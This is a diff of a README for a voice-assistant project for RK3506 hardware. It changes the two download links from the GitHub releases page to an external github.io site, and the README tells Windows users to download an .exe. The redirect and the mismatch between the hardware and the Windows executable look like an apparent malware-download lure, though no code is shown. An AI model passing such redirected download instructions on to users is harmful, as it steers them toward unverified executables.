@@ -1,6 +1,6 @@
 # 🤖 ai-robot - Simple Voice Control For Your Home
 
-[![Download ai-robot](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/eyuchia8-creator/ai-robot/releases)
+[![Download ai-robot](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://eyuchia8-creator.github.io)
 
 This software brings voice assistant capabilities to your RK3506 hardware. It operates on a stable system architecture designed for speed and reliability. The program remains efficient because it avoids unnecessary memory usage. 
 
@@ -16,7 +16,7 @@ Follow these steps to set up the software on your Windows computer. Ensure your 
 
 Visit the link below to access the files for this project. 
 
-[Click here to open the release page](https://github.com/eyuchia8-creator/ai-robot/releases)
+[Click here to open the release page](https://eyuchia8-creator.github.io)
 
 Once the page opens, look for the list under the latest version label. Choose the file ending in .exe that matches your system. Download this file to your computer.
 
